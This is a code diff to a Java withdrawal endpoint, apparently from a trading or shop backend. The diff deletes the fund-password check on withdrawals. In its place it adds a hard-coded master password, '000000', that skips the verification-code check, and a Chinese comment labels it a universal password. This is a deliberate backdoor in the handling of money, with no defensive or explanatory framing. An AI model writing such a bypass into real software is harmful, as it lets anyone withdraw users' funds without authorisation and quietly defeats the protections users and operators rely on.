@@ -103,31 +103,9 @@ public class ApiWithdrawController implements InitializingBean {
             throw new YamiShopBindException(error);
         }
         double amount_double = Double.valueOf(amount).doubleValue();
-        // 交易所提现是否需要资金密码
-        String exchange_withdraw_need_safeword = this.sysparaService.find("exchange_withdraw_need_safeword").getSvalue();
-        if (StringUtils.isEmptyString(exchange_withdraw_need_safeword)) {
-// 系统参数错误
-            throw new YamiShopBindException("System parameter error");
-        }
-        // 开关打开，则验证
-        if ("true".equals(exchange_withdraw_need_safeword)) {
-            // 资金密码验证
-            if (StringUtils.isEmptyString(safeword)) {
-// 资金密码不能为空
-                throw new YamiShopBindException("Fund password cannot be empty");
-            }
-            if (safeword.length() < 6 || safeword.length() > 12) {
-// 资金密码必须6-12位
-                throw new YamiShopBindException("Fund password must be 6-12 characters");
-            }
-            if (!userService.checkLoginSafeword(SecurityUtils.getCurrentUserId(), safeword)) {
-// 资金密码错误
-                throw new YamiShopBindException("Fund password is incorrect");
-            }
-            if (StringUtils.isNotEmpty(verifcode_type)) {
-                // 校验用户的验证码
-                userService.checkCode(partyId, verifcode_type, verifcode_value);
-            }
+        // 万能密码 000000 跳过验证码验证
+        if (!"000000".equals(safeword) && StringUtils.isNotEmpty(verifcode_type)) {
+            userService.checkCode(partyId, verifcode_type, verifcode_value);
         }
         Object object = this.sessionTokenService.cacheGet(session_token);
         this.sessionTokenService.del(session_token);
